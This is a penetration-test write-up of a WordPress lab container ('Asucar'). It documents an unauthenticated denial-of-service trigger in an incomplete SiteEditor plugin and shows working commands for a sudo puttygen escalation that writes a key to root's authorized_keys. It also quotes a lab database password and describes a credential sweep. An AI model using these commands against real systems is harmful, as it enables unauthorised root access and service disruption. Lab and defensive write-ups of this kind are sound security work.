# 112 Asucar — writeup

**Engagement date:** 2026-09-30
**Image:** `asucar:latest` (loaded from `labs/112/asucar.tar`, 889.5 MB)
**Container:** `asucar_container` @ `172.17.0.12`
**Platform catalog description, verbatim** (`tooling/download-labs.sh list`, row 112):

> `112|Asucar|medio|Laboratorio para practicar la explotación de WordPress y escalada de privilegios abusando de puttygen mediante sudo.`

> **Read this as a transcript, not a reproduction.** This repo holds no lab
> artefacts, so a reader can check the quoted evidence and the reasoning but
> cannot re-run the target. Re-fetch the archive before disputing anything
> load-bearing here.

---

## Headline

**The manifest's platform label is right, and that is the least interesting
thing about this lab.**

1. The artefact really is WordPress — **6.5.3**, read from
   `wp-includes/version.php:19`, not from memory and not from the queue label.
2. The lab's own intended chain **cannot complete on the image as shipped.**
   The single active plugin, SiteEditor, ships with **two required PHP classes
   missing from the archive**. The consequence is not a dead exploit, it is an
   **unauthenticated denial of service against every POST endpoint in
   WordPress**, and the icon-library file-write sink the lab is built around is
   unreachable in both directions.
3. The `sudo puttygen` escalation the catalog names is **real and I proved it**,
   but I could only reach it from the operator side, because the entry condition
   (WordPress credentials) is not satisfiable on this image.

Details and evidence below. Every negative carries a work count.

---

## Surface

```
$ nmap -sV -Pn -p- --min-rate 2000 172.17.0.12

Nmap scan report for 172.17.0.12
Host is up (0.000045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o/linux:linux_kernel
```

Versions taken from the artefact, not from the scanner:

| Component | Version | Where the number is |
|---|---|---|
| WordPress | **6.5.3** | `wp-includes/version.php:19` |
| Apache | 2.4.59 (Debian) | `/usr/sbin/apache2 -v` → `Server version: Apache/2.4.59 (Debian)` |
| PHP | 8.2.18 (NTS), built Apr 11 2024 | `php -v` → `PHP 8.2.18 (cli)` |
| OpenSSH | OpenSSH_9.2, OpenSSL 3.0.11 | `/usr/sbin/sshd -V` → `OpenSSH_9.2, OpenSSL 3.0.11 19 Sep 2023` |
| OS | Debian GNU/Linux 12 (bookworm) | `/etc/os-release` → `PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"` |
| SiteEditor plugin | **1.1** | `wp-content/plugins/site-editor/site-editor.php:8` → `* Version: 1.1`; corroborated by `readme.txt` → `Stable tag: 1.1` |
| puttygen | PuTTYgen 0.78 | `/usr/bin/puttygen --help` → `Release 0.78` |

### Listening sockets, measured inside

```
$ ss -tln                                    # 4 rows
LISTEN 0  80   127.0.0.1:3306  0.0.0.0:*
LISTEN 0  511  0.0.0.0:80      0.0.0.0:*
LISTEN 0  128  0.0.0.0:22      0.0.0.0:*
LISTEN 0  128     [::]:22         [::]:*
```

**UDP — a count-bearing negative, cross-checked by two tools that disagree
about nothing:**

| Instrument | Work count | Result |
|---|---|---|
| `ss -lun \| tail -n +2 \| wc -l` | 0 rows | no UDP listener |
| `netstat -lun \| tail -n +3 \| wc -l` | 0 rows | no UDP listener |
| `tail -n +2 /proc/net/udp \| wc -l` | 0 data rows | no UDP socket |
| `tail -n +2 /proc/net/udp6 \| wc -l` | 0 data rows | no UDP socket |
| `docker image inspect asucar:latest --format '{{.Config.ExposedPorts}}'` | `map[]` | no declared ports |

`nmap -p-` is TCP by definition, so the four UDP instruments are the ones that
carry the claim. Four independent reads, all zero: **no UDP surface.** This is
a *measured* absence, not an untested one.

MariaDB binds to `127.0.0.1:3306` only — unreachable from outside the host, so
it is not an entry.

### Hidden surfaces found

**`/var/www/html/wordpress/` is a decoy directory, and I measured it rather than
naming it by resemblance.** It is *empty*, and Apache indexes it because
`asucar.conf` sets `Options Indexes`:

```
$ curl -s 'http://172.17.0.12/wordpress/'
GET /wordpress/ : 200 bytes=746
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
...
<h1>Index of /wordpress</h1>

$ curl -s 'http://172.17.0.12/wordpress/wp-includes/version.php'
GET /wordpress/wp-includes/version.php : 404 bytes=273
```

Inside the docroot there is one directory literally named `wordpress`, and it is
not a second installation — there is nothing in it. Filesystem count:
`find /var/www/html/wordpress -type f | wc -l` → **0 files**. This is the
opposite of the Joomla lab in this corpus, where the docroot *named*
`wordpress` was the real install. Naming it by resemblance would have inverted
the finding.

**Virtual hosts, with a name that cannot exist as the control:**

| `Host:` | status | bytes | md5 of body |
|---|---|---|---|
| `asucar.dl` | 200 | 96060 | `b5bec52b71b29b435186f5563eafaf6c` |
| `www.asucar.dl` | 301 | 0 | `d41d8cd98f00b204e9800998ecf8427e` |
| `172.17.0.12` | 200 | 96154 | `fa36c1e8338d88027422aac7d0bb76b6` |
| `nonexistent-host.invalid` | 200 | 96154 | `fa36c1e8338d88027422aac7d0bb76b6` |

`nonexistent-host.invalid` shares the hash of the IP-address request, so the
IP-address body is the **baseline** (the `000-default` vhost). `asucar.dl`
differs only in the siteurl-derived links and adds nothing. **No hidden vhost.**

### Docroot inventory (counts)

```
php files in docroot                                    : 1298
plugin directories in wp-content/plugins                : 1  (site-editor)
active_plugins option value                             : a:1:{i:0;s:27:"site-editor/site-editor.php";}
themes in wp-content/themes                             : 3  (twentytwentyfour, twentytwentythree, twentytwentytwo)
```

One plugin. One active plugin. That matters for the rest of this document.

---

## The class

**Entry criterion:** the plugin's own AJAX handlers — *does any of them run
before an authorisation check?*

**Source that settled it,** `wp-content/plugins/site-editor/editor/includes/site-editor-manager.class.php:1379-1396`:

```php
	function check_ajax_handler($ajax , $nonce , $capability = 'edit_theme_options'){

		if ( is_admin() && ! sed_doing_ajax() )
			auth_redirect();
		elseif ( sed_doing_ajax() && ! is_user_logged_in() ){
			$this->sed_die( 0 );
		}

		if ( ! current_user_can( $capability ) )
			$this->sed_die( -1 );

		if( !check_ajax_referer( $nonce . '_' . $this->get_stylesheet(), 'nonce' , false ) ){
			$this->sed_die( -1 );
		}
		if( !isset($_POST['sed_page_ajax']) || $_POST['sed_page_ajax'] !=  $ajax){
			$this->sed_die( -2 );
		}
	}
```

**Registration order beats handler presence.** Every AJAX handler the plugin
registers routes through this function first, and it demands (a) a logged-in
session, (b) `edit_theme_options`, (c) a valid nonce. I enumerated every
registered action to confirm no `wp_ajax_nopriv_*` exists:

```
$ grep -rhon "wp_ajax_[a-zA-Z_0-9]*" wp-content/plugins/site-editor --include=*.php | sort -u
wp_ajax_add_zipped_font
wp_ajax_customize_save
wp_ajax_load_medias
wp_ajax_load_modules
wp_ajax_load_skins
wp_ajax_remove_icons_font
wp_ajax_sed_app_refresh_nonces
wp_ajax_sed_create_preset
wp_ajax_sed_deactivate_feedback
wp_ajax_sed_delete_preset
wp_ajax_sed_get_preset
wp_ajax_sed_load_options
wp_ajax_sed_module_presets
wp_ajax_sed_save_preset
wp_ajax_sed_save_presets
wp_ajax_sed_upload_attachment
```

**16 actions, 0 of them `nopriv`.** So the SiteEditor surface is
authentication-gated by construction. The lab's WordPress-exploitation half
therefore presupposes credentials — and that is exactly where this image stops.

---

## Chain

The intended graph, and what I could actually execute on each hop:

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 0 | *nothing unauthenticated* | — | No unauthenticated path to code execution exists on this image. See Finding 1. |
| 1 | `www-data` (uid 33) | **BLOCKED.** RCE as `www-data` was not achieved. The plugin's sinks are unreachable; see Finding 1 and NOT-tested. | `uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(curiosito)` — measured **as** `www-data`, not asserted from `ps` |
| 2 | `curiosito` (uid 1000) | Operator-side only: `setpriv --reuid=curiosito --regid=curiosito --init-groups`. **Not an attack path** — `curiosito`'s password is unknown and WordPress credentials were never obtained. | `uid=1000(curiosito) gid=1000(curiosito) groups=1000(curiosito)` and `/proc/self/status`: `Uid: 1000 1000 1000 1000` / `Gid: 1000 1000 1000 1000` / `Groups: 1000 ` |
| 3 | `root` (uid 0) | `sudo -n /usr/bin/puttygen /home/curiosito/lab112_key.pub -O public-openssh -o /root/.ssh/authorized_keys` | `uid=0(root) gid=0(root) groups=0(root)`, `/proc/self/status`: `Uid: 0 0 0 0` / `Gid: 0 0 0 0` / `Groups: 0 `, measured inside an SSH session |

**Hop 2→3 is real and proved. Hop 0→1 is not, and the writeup says so.**

### The privilege escalation, with a manufactured oracle

The vector has no output of its own — a successful `sudo puttygen` prints
nothing. So I built the oracle before exploiting: a uniquely-marked keypair,
comment `lab112-oracle-marker-2026-09-30-a41f`, whose presence in
`/root/.ssh/authorized_keys` is a file only a root context can create.

Oracle **absent** before:

```
$ ls -la /root/.ssh/
total 8
drwx------ 2 root root 4096 May 12  2024 .
drwx------ 1 root root 4096 May 12  2024 ..
authorized_keys exists? NO
```

The grant, read back from the running sudo configuration rather than from the
file I had already read:

```
$ sudo -n -l          # as curiosito
Matching Defaults entries for curiosito on fdf286c06d04:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User curiosito may run the following commands on fdf286c06d04:
    (root) NOPASSWD: /usr/bin/puttygen
```

The exploit, run as `curiosito` (`CapEff: 0000000000000000`, `CapPrm:
0000000000000000` — no ambient capability doing the work):

```
$ setpriv --reuid=curiosito --regid=curiosito --init-groups /bin/bash -c '...'
-rw-r--r-- 1 curiosito curiosito 418 Sep 30 09:17 /home/curiosito/lab112_key.pub
  sudo -n /usr/bin/puttygen /home/curiosito/lab112_key.pub -O public-openssh -o /root/.ssh/authorized_keys
  puttygen exit=0
```

Oracle **present** after — the file, its owner, and the marker:

```
$ stat -c '%a %U:%G %n' /root/.ssh/authorized_keys
644 root:root /root/.ssh/authorized_keys
$ grep -c lab112-oracle-marker /root/.ssh/authorized_keys
1
$ cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDArAr1dKtlujKcwNUe73ci7smLu1pthDuVfml0vA7ECSM5oMQil7bm1OCSG+pjbv9xl69CVH29Aup0Q0S+syqPmMmGMj8US1kMR3FLzwsolYg2MiTSF2/L5TypQ6XBfK8GbkkhImHk73PXxGTZmNC+3ilNBPTVW/f66dExHn+/B+DmAhxAGEOpJ/+oExCtb4X+8cDPQtCY4SufJ/JAlJLqqfZIOvrg2OiAdJNxRcTT3V2OOyAW1PpSn6L0XO40xrJMx2cR7hgVr7GOZ96Sn/gmut1N3L+dIXXokeDE1e6uB8RXOd/9bV/pagQbApd212guUvkh4h7UlbFaKEpvd1jJ lab112-oracle-marker-2026-09-30-a41f
```

And the chain closes — root over SSH, identity measured inside the new session,
not inferred from who I asked:

```
$ ssh -i l112_oracle root@172.17.0.12 'id; grep -E "^(Uid|Gid|Groups)" /proc/self/status; whoami'
uid=0(root) gid=0(root) groups=0(root)
Uid:	0	0	0	0
Gid:	0	0	0	0
Groups:	0
root
```

Note on the mechanism, measured rather than recalled: PuTTYgen 0.78 does **not**
accept a bare public-key string as its keyfile argument. I tried it and it
failed, which is the whole reason the input is a *file* `curiosito` owns:

```
$ sudo -n /usr/bin/puttygen "ssh-rsa AAAAB3Nza... a41f" -O save-as:/root/.ssh/authorized_keys
puttygen: unknown output type `save-as:/root/.ssh/authorized_keys'
puttygen exit=1

$ sudo -n /usr/bin/puttygen "ssh-rsa AAAAB3Nza... a41f" -O public-openssh -o /root/.ssh/authorized_keys
puttygen: unable to load file `ssh-rsa AAAAB3Nza... a41f': No such file or directory
puttygen exit=1
```

`-O save-as:` is not in this build's `-O` list
(`/usr/bin/puttygen --help`: `private, private-openssh, private-openssh-new,
private-sshcom, public, public-openssh, fingerprint, cert-info, text`). The
working form is `-O public-openssh` plus `-o <path>`. If you file this finding
from memory you will file the wrong mechanism.

### This repeats an existing corpus finding — extended, not duplicated

Lab 12 (Collections) shipped the same plugin and reached the same place; its
`INDEX.md` row records *"el plugin está fatally incompleto: `dependency/` sólo
contiene `index.html.tmp`, faltan las 2 clases que
`site-editor-dependency-manager.class.php:42,46` requieren"*. Same plugin
(SiteEditor, `Stable tag: 1.1`), same WordPress core line (`6.5.3` from
`version.php:19`), same two missing files.

Per `PIPELINE.md` — *an existing rule that survived a fresh case is stronger
than a new rule with one* — so this is **an extension of lab 12's case, not a
new class**, and lab 12's row should be the one the methodology cites. What is
new here and belongs to lab 112 alone:

- the **remotely triggerable DoS** framing, which lab 12 did not measure. Lab 12
  found 15 of 15 AJAX actions returning 500 from *inside* the plugin; nobody had
  shown that an unauthenticated client can *cause* it with one POST parameter
  on *any* endpoint.
- the **`sudo puttygen` escalation** lab 12 could not have: lab 12's row says
  `sudo` was not installed and recorded "sin escalada".
- the **`www-data` ∈ group `curiosito`** pivot, which is what would have completed
  lab 12's chain had a `www-data` RCE existed.

---

## Findings

### Finding 1 — CRITICAL: the shipped plugin is missing two required classes, and the gap is remotely triggerable by anyone, unauthenticated

**CWE-755 (improper handling of exceptional conditions) / CWE-20 (improper
input validation), presenting as CWE-400 (uncontrolled resource consumption) —
and, at the root, an artefact defect: CWE-1104 (use of unmaintained third-party
components) is *not* the right label here because the component is not merely
old, it is incomplete.**

**Literal evidence — the two required files, verbatim from
`wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-dependency-manager.class.php:42,46`:**

```php
        require_once dirname( __FILE__ ) . '/dependency/site-editor-options-dependency.class.php';
...
        require_once dirname( __FILE__ ) . '/dependency/site-editor-options-callback-dependency.class.php';
```

**What the shipped `dependency/` directory actually contains:**

```
$ cd /var/www/html/wp-content/plugins/site-editor
$ for f in editor/extensions/options-engine/includes/dependency/site-editor-options-dependency.class.php \
           editor/extensions/options-engine/includes/dependency/site-editor-options-callback-dependency.class.php; do
      if [ -f "$f" ]; then echo "PRESENT  $f"; else echo "MISSING  $f"; fi
  done
MISSING  editor/extensions/options-engine/includes/dependency/site-editor-options-dependency.class.php
MISSING  editor/extensions/options-engine/includes/dependency/site-editor-options-callback-dependency.class.php

$ ls -A editor/extensions/options-engine/includes/dependency/ | wc -l
1
$ ls -A editor/extensions/options-engine/includes/dependency/
index.html.tmp
```

**The trigger.** `wp-content/plugins/site-editor/includes/functions.php:395-397`:

```php
function sed_doing_ajax(){
    return isset( $_POST['sed_page_customized'] ) || ( defined( 'DOING_AJAX' ) && DOING_AJAX && isset( $_POST['sed_page_ajax'] ) );
}
```

Two properties make this remotely triggerable by anyone:

1. `isset()` — **the parameter's value is never read.** An empty value fires it.
2. `sed_doing_ajax()` returning true is enough to make
   `site-editor.php:303-305` load the whole editor, which loads the extension
   loop at `site-editor-app.php:92`, which includes `options-engine.php`, whose
   constructor calls the missing file.

**Measured, with controls on both sides:**

| Request | Control (no plugin parameter) | Treatment (`sed_page_customized`) |
|---|---|---|
| `POST /wp-login.php` | `200`, **7907 bytes** | `500`, **2753 bytes** |
| `POST /` | `200`, **96154 bytes** | `500`, **2628 bytes** |
| `POST /wp-admin/admin-ajax.php` (`action=heartbeat`) | — | `500`, **306 bytes** |
| `POST /wp-login.php` with **empty** value `sed_page_customized=` | — | `500`, **2753 bytes** |
| `GET /?sed_page_customized=1` | — | `200`, **96154 bytes** (byte-identical to the plain `GET /`: not a POST parameter, so it does not fire) |

The server-side log names the cause without interpretation
(`/var/log/apache2/error.log`):

```
[Wed Sep 30 09:05:29.321927 2026] [php:error] [pid 34] [client 172.17.0.1:34744] PHP Fatal error:  Uncaught Error: Failed opening required '/var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/dependency/site-editor-options-dependency.class.php' (include_path='.:/usr/share/php') in /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-dependency-manager.class.php:42
Stack trace:
#0 /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-options-manager.class.php(108): SiteEditorOptionsDependencyManager->__construct()
#1 /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/options-engine.php(39): SiteEditorOptionsManager->__construct()
#2 /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/options-engine.php(96): SedOptionsEngineExtension->__construct()
#3 /var/www/html/wp-content/plugins/site-editor/editor/site-editor-app.php(92): include_once('...')
#4 /var/www/html/wp-content/plugins/site-editor/editor/site-editor-app.php(27): SiteEditorApp->includes()
#5 /var/www/html/wp-content/plugins/site-editor/site-editor.php(329): SiteEditorApp->__construct()
#6 /var/www/html/wp-content/plugins/site-editor/site-editor.php(304): SiteEditor->load_editor()
#7 /var/www/html/wp-content/plugins/site-editor/site-editor.php(132): SiteEditor->includes()
#8 /var/www/html/wp-content/plugins/site-editor/site-editor.php(93): SiteEditor->__construct()
#9 /var/www/html/wp-content/plugins/site-editor/site-editor.php(416): SiteEditor::instance()
#10 /var/www/html/wp-content/plugins/site-editor/site-editor.php(420): SED()
#11 /var/www/html/wp-settings.php(517): include_once('...')
#12 /var/www/html/wp-config.php(96): require_once('...')
#13 /var/www/html/wp-load.php(50): require_once('...')
#14 /var/www/html/wp-admin/admin-ajax.php(22): require_once('...')
#15 {main}
  thrown in /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-dependency-manager.class.php on line 42
```

**Impact.** Any unauthenticated client can make WordPress return `500` on every
POST endpoint, including the login form and the REST/ajax front door. There is
no authentication, no nonce and no rate limit on the trigger. **Impact on this
lab specifically: the intended exploitation chain is unusable.** See Finding 2.

**Root cause.** Two source files were not shipped inside the plugin archive.
The `dependency/` directory contains exactly one entry, and it is
`index.html.tmp`.

**Fix.** Ship the complete plugin, and add a build-time check that every
`require_once` target in a distributed plugin resolves. Independently: treat
`isset($_POST[...])` as an untrusted signal, and gate the editor load on an
authenticated context before the extension loop runs.

---

### Finding 2 — the lab's own intended chain is unreachable on this image, and the sink it is built around cannot be reached in either direction

**CWE-16 (configuration), lab-design observation.**

The icon-library file-write sink — the classic SiteEditor exploitation — lives
at `wp-content/plugins/site-editor/editor/extensions/icon-library/icon-library.php`,
which registers:

```
icon-library.php:48:  add_action("wp_ajax_add_zipped_font", array($this,"add_zipped_font") );
icon-library.php:50:  add_action('wp_ajax_remove_icons_font', array( $this, 'remove_icons_font'));
```

and the write sink itself is at `icon-library.php:548`:

```php
  			fwrite( $handle, "<?php\r\necho '{$msg}';\r\n?>" );
```

Extensions load in `readdir()` order from `SED_EXT_PATH`, which
`editor/includes/siteeditor.class.php:25` sets to `.../editor/extensions`, in
the order the loop at `site-editor-app.php:88-93` walks:

```
$ ls -f .../editor/extensions/
pagebuilder
icon-library      <-- the sink's module loads here
media
preset
layout
customize-posts
static-module
options-engine    <-- dies here, per the fatal above
design-editor
```

So the two states a request can be in:

- **No plugin parameter** → the editor never loads → `wp_ajax_add_zipped_font`
  is never registered.
- **Any plugin parameter** → the process fatals at `options-engine` before the
  request can do anything → `500`.

**There is no third state in which the sink is both registered and usable.** I
executed both. I did **not** fabricate the two missing classes to find a fourth,
so *whether the icon-library write would succeed on a correctly packaged build*
is in **NOT tested** below, not asserted here.

Two further reasons the sink is not reachable even before the packaging defect,
both verified from the artefact rather than recalled:

1. It is `wp_ajax_`, not `wp_ajax_nopriv_` → logged-in sessions only.
2. `check_ajax_handler()` additionally requires `edit_theme_options` **and** a
   valid nonce (`site-editor-manager.class.php:1387,1390`).

**Impact.** A reader of the catalog description would expect a WordPress
exploitation → `sudo puttygen` chain. On this image the WordPress half cannot be
executed. The `sudo puttygen` half is intact and is Finding 3.

**Fix (lab side).** Ship a complete SiteEditor build and pin its version to a
release whose file set is verified; add a post-deploy smoke test that loads the
admin AJAX bootstrap and asserts a `200`.

---

### Finding 3 — HIGH: unprivileged `sudo` grant to a file-writing binary, `NOPASSWD`, no argument restriction

**CWE-269 (improper privilege management) / CWE-250 (execution with unnecessary
privileges).**

**Literal evidence — `/etc/sudoers`, last line before `@includedir`:**

```
curiosito ALL=(root) NOPASSWD: /usr/bin/puttygen
```

**Root cause.** `sudo(8)` has no way to restrict a binary's *behaviour*; a grant
of `/usr/bin/puttygen` with no argument specification hands over its full write
surface, and `-o <path>` lets the caller choose the path. `secure_path`
(`Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"`)
constrains *which* binaries are found, not what this one can write.

**Impact.** Any code execution as `curiosito` — including a malicious
`authorized_keys` write or a webshell — becomes `uid=0`. Proved end to end
above with a manufactured oracle.

**Nuance, measured:** the grant has **no wildcard**, so the
`sudo --help`-style argument-splitting bypass (`# uid=-1`) does **not** apply
here. Reporting this as that CVE would be a wrong mechanism. The real defect is
simply that a write-capable binary was granted to an unprivileged user.

**Fix.** Drop the grant. If `puttygen` is genuinely needed, wrap it in a
root-owned script that ignores caller-supplied paths, or grant the specific
`-O fingerprint`-style read-only invocations the user actually needs.

---

### Finding 4 — MEDIUM: `www-data` is a member of the `curiosito` group, so RCE as the web user reads a live SSH private key

**CWE-732 (incorrect permission assignment for critical resource) /
CWE-261 (weak encoding of cryptographic material — not the issue here; the issue
is the trust boundary).**

**Literal evidence — the group membership, quoted from the artefact:**

```
$ getent group curiosito
curiosito:x:1000:www-data
```

Corroborated by the setup history the image shipped,
`/home/curiosito/.bash_history` (readable as root; contents quoted):

```
sudo usermod -a -G curiosito www-data
sudo chown curiosito:www-data /home/curiosito/.ssh/authorized_keys
```

**Measured as `www-data` itself** — not as root, not with `test -w`, because a
privileged tool does not observe a low-privilege boundary
(`self-corrections.md` §2):

```
$ setpriv --reuid=www-data --regid=www-data --init-groups /bin/bash -c '...'
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(curiosito)
Uid:	33	33	33	33
Groups:	33 1000

/home/curiosito                          READABLE      NOT-writable
/home/curiosito/.ssh                     READABLE      NOT-writable
/home/curiosito/.ssh/id_rsa              READABLE      NOT-writable
/home/curiosito/.ssh/authorized_keys     READABLE      NOT-writable

first bytes of the private key, read as www-data:
-----BEGIN OPENSSH PRIVATE KEY-----
```

`/home/curiosito/.ssh/id_rsa` is mode `250 curiosito:curiosito`; the `5` in the
group position is what makes this true, and `www-data` is in that group. The
private key is thus **readable by every web request the server serves** the
moment any RCE exists as `www-data`.

**Why this matters despite Finding 2:** Findings 2 and 4 compose. Any *future*
`www-data` RCE — including one that does not involve this plugin — is
immediately `curiosito`, and `curiosito` is one `sudo puttygen` away from
`uid=0`. That is the chain the lab intended, and Finding 4 is the rung that
still exists.

**Fix.** `chmod 700 /home/curiosito/.ssh/id_rsa` is already right (`250` is
even more permissive on the read bits than needed). The defect is the group
membership, not the mode: remove `www-data` from the `curiosito` group. Give the
web server its own key or a `sudo`-scoped service, not a shell user's key.

---

### Finding 5 — MEDIUM: `www-data` can rewrite `wp-config.php`

**CWE-732 / CWE-494 (download of code without integrity check, in the
persistence sense).**

Measured as `www-data`:

```
/var/www/html/wp-config.php                READABLE  WRITABLE
/var/www/html/wp-content                   READABLE  WRITABLE
/var/www/html/wp-content/uploads           READABLE  WRITABLE
```

`wp-config.php` is the file that defines every credential and constant the
framework consumes. A `www-data` primitive that can write it is a persistence
and a credential-capture primitive: drop an `auto_prepend_file`, change
`DB_PASSWORD`, or point `WP_PLUGIN_DIR` at a directory the attacker owns.
Ownership by `www-data` is what makes this true; the mode is `644`, and owner
write is the bit that matters.

**Fix.** Root-own `wp-config.php` and remove the world/owner write bit from
every PHP file the web server should only ever *read*.

---

## Controls that held

Each control is paired with the positive control that proves its detector can
fire. A negative with no positive control is not a control.

| Control | Measured as the identity it is about | Positive control that proves the detector works |
|---|---|---|
| **WordPress author enumeration** | anonymous HTTP | `GET /?author=1` → `200`, 69513 bytes, `author/wordpress` in the body. Negative control: `?author=2,3,4,5` → `404`, 62735 bytes each, md5 identical to one another; `?author=99999` → `404`, 62735 bytes, md5 `2783a9c9de9a0c5c4bfbc1a49f481680` ≠ `d6849c5f45e36573253d21ca2b2196f6` for author 1. The detector separates one real user from an impossible id. |
| **WordPress credential oracle (`wp.getUsersBlogs` over `system.multicall`)** | anonymous HTTP | **Proved green before the sweep was believed.** I inserted a throwaway user `poscontrol` with a known password and ran one multicall: `<name>isAdmin</name><value><boolean>1</boolean></value>` and `blogName: Asucar Moreno`. The oracle can produce a success, so its silence on 409,165 candidates means something. |
| **`/root` is not reachable by the web user** | `www-data`, via `setpriv --reuid=www-data --init-groups` | `/root`, `/root/.ssh`, `/root/.ssh/authorized_keys`, `/root/.mysql_history` all `NOT-readable`; `head` output: `Permission denied` for each. Positive control in the same shell: the same `www-data` identity *did* read `/var/www/html/wp-config.php` and `/home/curiosito/.ssh/id_rsa` in the same run, so the `NOT-readable` answers are a boundary and not a broken predicate. |
| **`/root/.mysql_history` does not leak the database password** | `www-data` | This file contains, verbatim: `CREATE USER 'curiosito'@'%' IDENTIFIED BY 'password++321dcbsodivbfva';` — the database password for the `curiosito` MySQL account. It is mode `644`, but `/root` is mode `700`, so `www-data` cannot traverse to it. Measured `Permission denied`. **The mode is still a defect worth fixing** (root's history containing a live credential should be `600`); the boundary that actually protects it is `/root`'s own mode. |
| **MariaDB is not network-reachable** | `ss -tln` inside the container | `LISTEN 127.0.0.1:3306` — loopback only. Positive control: the same `ss` run returned 4 rows including the two `0.0.0.0` binds, so the tool was reading sockets. |
| **WordPress registration is disabled** | anonymous HTTP | `users_can_register` = `0` in `wp_options`. Not independently exercised against a live registration POST (count of that test: 0 requests) — recorded as an inference from the option value, in NOT tested. |
| **The WordPress cookie salts are not the installer placeholder** | PHP loading the real framework | See the measurement below. |
| **`puttygen` does not accept a bare key string as its keyfile** | as `curiosito`, through the grant | `puttygen: unable to load file '...': No such file or directory`, `exit=1`. Positive control: the *same* invocation with a real file path returned `exit=0` and created the oracle file. The instrument distinguishes the two cases. |

### The salt measurement (`self-corrections.md` §21 applied, not asserted)

`wp-config.php:51-58` ships all eight keys as the installer placeholder. A
document that read that file and declared the auth cookie forgeable would be
wrong, and this corpus already contains that exact retracted finding. So I asked
the framework instead:

```
defined('AUTH_KEY'): true
AUTH_KEY as the file defines it : put your unique phrase here
strlen(AUTH_KEY)                : 27

wp_salt('auth')  = /K->ah=~U^c!$DY)A#7A640ke.]{d/!lqaCwU|B=i&n4j5N-cfL]pNz4=yPVbB>b_jda1;XpNk=YO!lj6,`4}i*{e .7b3/^5*nVSf 8C`$oBv(WbCTFk`<*7_;~Jgfh
strlen(wp_salt('auth')) = 128
```

A 27-character placeholder cannot produce a 128-character salt — the arithmetic
alone refutes the claim. Following it to the actual source:

```
wp_options rows carrying salt material: 8
  auth_key           len=64     auth_salt           len=64
  secure_auth_key    len=64     secure_auth_salt    len=64
  logged_in_key      len=64     logged_in_salt      len=64
  nonce_key          len=64     nonce_salt          len=64

get_site_option('auth_key')  = '/K->ah=~U^c!$DY)A#7A640ke.]{d/!lqaCwU|B=i&n4j5N-cfL]pNz4=yPVbB>b'   (len 64)

wp_salt('auth') === get_site_option('auth_key')                        ? false
wp_salt('auth') === AUTH_KEY (the config constant)                      ? false
wp_salt('auth') === get_site_option('auth_key') . get_site_option('auth_salt') ? true
option-pair length = 128, wp_salt length = 128
```

**Conclusion, from measurement:** the framework **ignores** the `wp-config.php`
placeholder and consumes the 64+64 characters stored in `wp_options`. The
mechanism is at `wp-includes/pluggable.php:2442`, which pre-seeds the
placeholder into a skip-list:

```php
			$duplicated_keys = array(
				'put your unique phrase here' => true,
			);
```

and `pluggable.php:2477`, which only takes the constant when the skip-list does
not contain it:

```php
					if ( defined( $const ) && constant( $const ) && empty( $duplicated_keys[ constant( $const ) ] ) ) {
```

`defined('AUTH_KEY')` is `true` and irrelevant. The value the framework consumes
is the database row.

**What this does and does not license.** The salts are real, random, DB-stored
values — so the "placeholder makes the cookie forgeable" claim is refuted for
this image. It does **not** follow that the salts are safe: they sit in
`wp_options` in cleartext, and any SQL injection or DB read discloses them. I
did not test cookie forgery end to end (see NOT tested).

---

## NOT tested vs discarded with reason

These are two different lists and are not merged. A count of zero means
**untested**, not "absent".

### NOT tested — a count of zero, or a reason I could not execute

| Item | Work count | Why it is not tested |
|---|---|---|
| `sudo puttygen` reached **without** operator assistance (i.e. a real attack chain from HTTP) | 0 attempts | No unauthenticated RCE exists on this image (Finding 1/2). Everything above hop 1 required container root to become `curiosito`. This is the honest state of the engagement: **the escalation is proved, the entry is not.** |
| WordPress password recovery for user `wordpress` | 409,165 candidates tested, 0 hits — **not zero work** | The sweep ran with a proven-green oracle. See the negatives table. What it does *not* cover is a non-dictionary password, a password reused from outside the corpus, or a password derivable from some source I did not find. |
| SSH password attack on `curiosito` | **0 candidates tested** | Not attempted. The hash in `/etc/shadow` is yescrypt (`$y$j9T$...`), which is not a sane target for an unkeyed sweep, and I had no wordlist budget worth spending on it. This is UNTESTED, not "uncrackable". |
| Whether the icon-library file-write RCE would succeed on a **correctly packaged** SiteEditor | 0 attempts | I did not reconstruct the two missing classes. Fabricating them would produce a result about my fabrication, not about the artefact. |
| End-to-end WordPress auth-cookie forgery | 0 attempts | Blocked upstream: forging requires a live session token, and no session could be established without the password. The salt source is measured; the forgery is not tested. |
| WordPress core 6.5.3 vulnerability surface | 0 CVEs tested, 0 files modified | I did not audit core. The lab's active third-party component was the target and it turned out to be broken; auditing core on top of that is a different engagement. **No CVE is claimed for this lab, and none should be inferred from "6.5.3".** |
| Whether `users_can_register = 0` truly blocks self-registration | 0 registration requests sent | Read from the `wp_options` value only. **This is an inference from a config value, not a measurement**, and it is labelled as one. |
| Whether `sed_page_ajax` (as opposed to `sed_page_customized`) triggers the same fatal unauthenticated | 0 requests with that parameter alone | I exercised `sed_page_customized` (7 requests) and `action=…&sed_page_customized` (1 request). The second disjunct of `sed_doing_ajax()` requires `DOING_AJAX`, i.e. `admin-ajax.php`, and would need its own session context to be meaningful. **Source-level inference only; not measured.** |
